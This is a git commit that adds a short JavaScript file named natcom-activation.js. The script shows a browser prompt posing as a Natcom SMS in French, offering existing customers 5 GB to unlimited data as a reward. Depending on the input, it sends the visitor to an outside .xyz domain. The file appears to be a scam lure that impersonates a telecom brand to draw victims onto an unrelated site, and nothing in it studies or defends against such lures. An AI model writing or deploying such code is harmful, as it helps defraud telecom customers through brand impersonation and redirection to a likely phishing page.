810eb179473d47ceb07e79584e1bd4b16b5949bc
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-01 00:41:07 -0700

    Create natcom-activation.js

---
+++ natcom-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Natcom SMS: Cher client, veuillez vérifier si votre carte SIM Natcom est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/natcom';
+}
